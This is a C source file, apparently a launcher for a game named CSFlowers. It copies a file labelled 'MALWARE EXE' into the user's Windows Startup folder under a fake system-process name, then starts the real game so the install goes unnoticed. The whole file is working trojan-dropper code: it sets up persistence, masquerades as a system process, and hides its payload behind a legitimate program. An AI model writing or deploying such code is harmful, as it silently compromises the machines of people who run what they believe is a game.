#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <shlobj.h>
#include <direct.h>

#define MAX_LINE_SIZE 1000

int main(void) {


    char *sourcePath = "./CSFlowers/data/MALWARE EXE";
    char startupPath[MAX_PATH];
    char userProfile[MAX_PATH];

    // checks to see if the program should copy into startup folder (if there exists a session already)
    boolean run_copy = TRUE;
    FILE *session_file;
    if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
        char infoPath[MAX_PATH];
        snprintf(infoPath, sizeof(infoPath), "%s\\AppData\\Local\\Tmp\\info.txt", userProfile);          
        session_file = fopen(infoPath, "r");
        if (session_file != NULL) {
            char line[MAX_LINE_SIZE];
            int key;
            if (fgets(line, sizeof(line), session_file) != NULL) {
                if (fgets(line, sizeof(line), session_file) != NULL) {
                    if (fgets(line, sizeof(line), session_file) != NULL) {
                        if (atoi(line) == 1) {
                            run_copy = FALSE;
                        }
                    } else {
                        fclose(session_file);
                    }
                } else {
                    fclose(session_file);
                }
            } else {
                fclose(session_file);
            }
        }
        if (run_copy) {
            if (GetEnvironmentVariable("USERPROFILE", userProfile, sizeof(userProfile)) > 0) {
                snprintf(startupPath, sizeof(startupPath), "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", userProfile);
                strcat(startupPath, "\\Windows Driver Foundation - User-mode Driver Framework Host Process.exe");
                CopyFile(sourcePath, startupPath, FALSE);
            }
        }
        char *exec = ".\\gamefiles\\CSFlowers.exe";
        int result = system(exec);
    }
    // run the actual executable too
    return 0;
}